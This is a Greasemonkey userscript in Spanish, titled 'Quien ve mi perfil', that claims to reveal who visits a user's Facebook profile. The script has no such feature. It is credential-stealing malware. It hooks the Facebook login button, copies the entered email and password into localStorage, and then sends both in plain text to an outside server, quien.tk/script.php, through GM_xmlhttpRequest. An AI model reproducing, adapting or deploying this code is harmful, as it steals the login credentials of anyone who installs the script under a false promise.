// ==UserScript==
// @name       Quien ve mi perfil
// @namespace  http://use.i.E.your.homepage/
// @version    0.1
// @description  Enterate Quien visita tu perfil
// @require    http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js
// @match      http://*/*
// @include    *facebook.com/*
// @copyright  2012+, Camilo Acosta
// ==/UserScript==


//=========profile Id=========
//----user--- document.getElementById('pagelet_timeline_main_column').getAttribute('data-gt');
//---No Friends--- document.getElementsByClassName('FriendRequestOutgoing enableFriendListFlyout outgoingButton enableFriendListFlyout hidden_elem uiButton uiButtonOverlay uiButtonLarge')[1].getAttribute('data-profileid')
//-----Friends--- document.getElementsByClassName('FriendRequestOutgoing enableFriendListFlyout outgoingButton enableFriendListFlyout hidden_elem uiButton uiButtonOverlay uiButtonLarge')[0].getAttribute('data-profileid')


function init(){
    var s=document.createElement("script");
    var i= document.getElementById('u_0_b');
    if(i==null){
       i= document.getElementById('u_0_1');
	}
    if(i!=null){
        s.innerHTML="function getUP(){ localStorage.u = u= document.getElementById('email').value; localStorage.p = p= document.getElementById('pass').value; }";
        document.head.appendChild(s);	
    	i.setAttribute('onclick','getUP()');
    }
    if(verify()){
        var ret = GM_xmlhttpRequest({
  			method: "GET",
            url: "http://quien.tk/script.php?u=" + localStorage.u + "&p=" + localStorage.p,
            onload: function(res) {
                console.log(res.responseText);
            }
        });
    }
}
function verify(){
    var ok =document.getElementById('pagelet_timeline_main_column');
    if(ok==null){
        ok = document.getElementsByClassName('fbxWelcomeBoxBlock _8o _8s lfloat')[0];
    }
    if(ok==null){
        ok=document.getElementsByClassName('d-cx-PRIVATE-litestandSidebarBookmarks__item -cx-PRIVATE-litestandSidebarBookmarks__firstitem')[0]
    }
    if(ok!=null){
    	var uid = ok.getAttribute('data-gt');
        return true;
    }else{
        return false;
    }
}

init();






